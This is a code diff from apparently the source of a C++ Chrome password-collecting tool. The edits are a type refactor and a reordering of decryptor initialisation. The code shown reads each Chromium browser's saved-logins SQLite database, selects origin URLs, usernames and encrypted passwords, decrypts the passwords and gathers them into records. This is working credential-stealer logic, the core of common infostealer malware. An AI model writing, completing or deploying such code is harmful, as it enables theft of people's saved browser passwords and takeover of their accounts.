@@ -5,7 +5,7 @@
 #include "../includes/cJSON.h"
 #include "../includes/ChromePasswordCollecter.h"
 
-List<userData> ChromePasswordCollecter::collectData()
+std::vector<userData> ChromePasswordCollecter::collectData()
 {
 	for (const auto& browser : m_chromeList)
 	{
@@ -14,10 +14,13 @@ List<userData> ChromePasswordCollecter::collectData()
 
 	return m_collectedData;
 }
-void ChromePasswordCollecter::collectFromPath(const String& chromePath)
+void ChromePasswordCollecter::collectFromPath(const std::string& chromePath)
 {
-
-	if (!getDbPath(chromePath)) return;
+	if (!m_decryptor.initDecryptor(chromePath))
+		return;
+	
+	if (!getDbPath(chromePath))
+		return;
 
 	sqlite3* db;
 
@@ -29,8 +32,6 @@ void ChromePasswordCollecter::collectFromPath(const String& chromePath)
 	if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, 0) != SQLITE_OK)
 		return;
 
-	if (!m_decryptor.initDecryptor(chromePath))
-		 return;
 
 	//go over the db and fill the inforamtion by row
 	while (sqlite3_step(stmt) == SQLITE_ROW)
@@ -50,7 +51,7 @@ void ChromePasswordCollecter::collectFromPath(const String& chromePath)
 			userData.url = url;
 		if (username)
 			userData.username = username;
-		String decPassword;
+		std::string decPassword;
 		
 		if (m_decryptor.decrypt(password, decPassword, sqlite3_column_bytes(stmt, 2)))
 			userData.password = decPassword;
@@ -61,7 +62,7 @@ void ChromePasswordCollecter::collectFromPath(const String& chromePath)
 }
 
 
-bool ChromePasswordCollecter::getDbPath(const String& chromePath)
+bool ChromePasswordCollecter::getDbPath(const std::string &chromePath)
 {
 	const int localData = 0x001c;
 	std::string path = m_decryptor.getAppFolder(localData);
